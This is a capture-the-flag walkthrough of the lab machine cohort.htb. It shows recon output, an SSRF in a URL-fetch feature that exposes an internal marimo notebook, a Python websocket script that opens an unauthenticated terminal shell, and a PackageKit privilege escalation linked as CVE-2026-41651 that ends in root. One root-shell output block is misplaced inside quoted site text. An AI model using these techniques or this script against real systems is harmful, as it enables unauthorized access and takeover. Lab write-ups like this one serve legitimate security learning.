```bash
[+] Summary written to /home/kali/github/ctf_tool/results/cohort.htb/summary.txt


  ════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.129.2.223
  DNS:           cohort.htb
  HTTP:          80
  HTTPS:         443
  Generated:     2026-08-02 08:36:23

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.24.0 (Ubuntu)
  443/tcp      open       ssl/http         nginx 1.24.0 (Ubuntu)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (0 found)
  ────────────────────────────────────────────────────────
  none

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (3 found)
  ────────────────────────────────────────────────────────

  [ https://cohort.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  301      /api
  301      /assets
  403      /status  [forbidden — try privesc]

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/github/ctf_tool/results/cohort.htb/ ===

```

We have ssh and a website. We didnt find any subdomains. 
The website is pretty basic. There isnt much but you are able to give it an url of data and it will fetch it. 

```bash
What validation checks

    The endpoint resolves and responds within a few seconds.
    The response status and content type look like a real export.
    We capture a short preview so you can confirm it is the right feed.

Notes


```bash
.suid_bash-5.2# pwd
/root
.suid_bash-5.2# ls 
root.txt
.suid_bash-5.2# 
───────────────────
```

    For security, internal and loopback addresses are rejected.
    We never store credentials in the URL. Use a signed link or an allow-listed IP instead.
    Validation does not import data. Reconciliation is a separate, scheduled step.
```


We are able to read the /status with the fetch even though we dont have access to it

```bash
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

The most exciting one is the one on port 8888


```bash
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>marimo</title>
</head>
<body style="
    background-color: #f4f4f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;">
  <form method="POST" action="/auth/login" style="
    padding: 20px;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    width: 300px;
    text-align: center;">
    <div style="margin-bottom: 20px;">
      <label for="password" style="
        display: block;
        margin-bottom: 5px;
        font-size: 16px;
        font-family: Arial, sans-serif;
        color: #333;">Access Token / Password</label>
      <input id="password" name="password" type="password" style="
        width: 100%;
        box-sizing: border-box;
        padding: 8px;
        border: 1px solid #ccc;
        border-radius: 4px;">
    </div>
    <button type="submit" style="
        background-color: #1C7362;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;">Login</button>
    <p style="color: red;"></p>
  </form>
</body>
</html>
```

Its marimo and it has a login screen on it. lets dig further

I researched enough to know that marimo has plenty of CVE's but we dont know what version its running. 

https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc

```bash
cat exp.py
import ssl
import websocket
import threading
import sys
import termios
import tty

host = "nb-1be3782a8afd3ad5.cohort.htb"

ws = websocket.create_connection(
    "wss://10.129.244.174/terminal/ws",
    host=host,
    origin=f"https://{host}",
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

def recv():
    while True:
        try:
            data = ws.recv()
            if data:
                sys.stdout.write(data)
                sys.stdout.flush()
        except:
            break

def main():
    old = termios.tcgetattr(sys.stdin)

    try:
        tty.setraw(sys.stdin.fileno())

        threading.Thread(target=recv, daemon=True).start()

        while True:
            ch = sys.stdin.read(1)

            if ch == "\x04":   # Ctrl-D
                break

            ws.send(ch)

    finally:
        termios.tcsetattr(
            sys.stdin,
            termios.TCSADRAIN,
            old
        )
        ws.close()

if __name__ == "__main__":
    print("[+] connected")
    main()
```

We receive a shell

```bash
╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
PackageKit version detected: 1.2.8-2ubuntu1.2
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
```
https://github.com/0xBlackash/CVE-2026-41651/blob/main/CVE-2026-41651.py

We find this script and once executed we get root shell

```bash
.suid_bash-5.2# pwd
/root
.suid_bash-5.2# ls 
root.txt
.suid_bash-5.2# 
───────────────────
```

